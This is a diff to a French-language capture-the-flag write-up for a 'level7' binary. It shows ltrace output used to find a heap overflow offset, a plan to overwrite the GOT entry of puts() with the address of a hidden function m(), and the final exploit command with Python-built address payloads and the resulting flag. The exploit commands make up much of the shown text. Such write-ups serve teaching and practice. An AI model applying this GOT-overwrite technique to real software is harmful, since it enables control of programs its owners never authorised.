@@ -167,20 +167,20 @@ On trouve egalement une fonction `m()` non appelee qui elle contient une fonctio
 Pour notre exploit, on va utiliser le 1er appel a la fonction `strcpy()` pour overwrite l'adresse du 2e. Ce qu'on veux c'est overwrite `puts()` pour acceder a la fonction `m()` a la place
 
 ```
-:~$ ltrace ./level7 AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz test2
-__libc_start_main(0x8048521, 3, 0xbffff704, 0x8048610, 0x8048680 <unfinished ...>
-malloc(8)                                                         = 0x0804a008
-malloc(8)                                                         = 0x0804a018
-malloc(8)                                                         = 0x0804a028
-malloc(8)                                                         = 0x0804a038
-strcpy(0x0804a018, "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPp"...)         = 0x0804a018
-strcpy(0x6c4c6b4b, "test2" <unfinished ...>
+:~$ ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag test2
+__libc_start_main(0x8048521, 3, 0xbffff724, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                            = 0x0804a008
+malloc(8)                                                            = 0x0804a018
+malloc(8)                                                            = 0x0804a028
+malloc(8)                                                            = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)            = 0x0804a018
+strcpy(0x37614136, "test2" <unfinished ...>
 --- SIGSEGV (Segmentation fault) ---
 +++ killed by SIGSEGV +++
 
 ```
 
-On trouve un offset a **20**.
+On trouve un offset a [20](https://wiremask.eu/tools/buffer-overflow-pattern-generator/).
 
 On va overflow le premier argument avec l'adresse de puts dans le GOT pour mettre ensuite l'adresse de `m()` dans le second. Pour ce faire on va chercher l'adresse de puts dans le GOT.
 
@@ -210,4 +210,5 @@ Ce qui nous donne:
 ```
 :~$ ./level7 $(python -c 'print "a" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1725451881
 ```
